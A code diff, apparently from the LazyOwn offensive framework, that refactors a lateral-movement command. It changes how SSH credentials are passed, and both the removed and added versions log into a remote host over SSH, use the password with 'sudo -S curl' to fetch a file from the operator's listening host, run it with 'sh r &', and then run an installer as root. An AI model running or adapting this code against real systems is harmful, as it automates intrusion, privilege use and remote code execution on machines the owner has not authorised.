@@ -1279,18 +1279,23 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
         if username == "CHANGE_ME" or password == "CHANGE_ME":
             print_error("start_user and start_pass must be configured in payload.json")
             return
-        ssh = f"""sshpass -p '{password}' ssh {username}@{self.params['rhost']} '
-        mkdir -p {tmp} ;
-        cd {tmp} ;
-        {command_remote} ;
-        if [ ! -s {name} ]; then echo "Error: File is empty"; exit 1; fi ;
-        tar -vzxf {name} ;
-        echo "{password}" | sudo -S curl http://{self.params['lhost']}/r -o r ;
-        sh r &'
-        """
-        self.cmd(ssh)
-        ssh_install = f"sshpass -p '{password}' ssh {username}@{self.params['rhost']} 'cd {tmp}/LazyOwn-{version} ; echo \"{password}\" | sudo -S bash install.sh &'"
-        self.cmd(ssh_install)
+        import os as _os
+        from core.hardening import set_sshpass_env
+        _env = set_sshpass_env(password)
+        ssh_args = [
+            "sshpass", "-e", "ssh", f"{username}@{self.params['rhost']}",
+            f"mkdir -p {tmp} ; cd {tmp} ; {command_remote} ; "
+            f"if [ ! -s {name} ]; then echo 'Error: File is empty'; exit 1; fi ; "
+            f"tar -vzxf {name} ; "
+            f"echo \"{password}\" | sudo -S curl http://{self.params['lhost']}/r -o r ; "
+            f"sh r &"
+        ]
+        subprocess.run(ssh_args, shell=False, env=_env, check=False)
+        ssh_install_args = [
+            "sshpass", "-e", "ssh", f"{username}@{self.params['rhost']}",
+            f"cd {tmp}/LazyOwn-{version} ; echo \"{password}\" | sudo -S bash install.sh &"
+        ]
+        subprocess.run(ssh_install_args, shell=False, env=_env, check=False)
         return
 
     @cmd2.with_category("08. Lateral Movement")
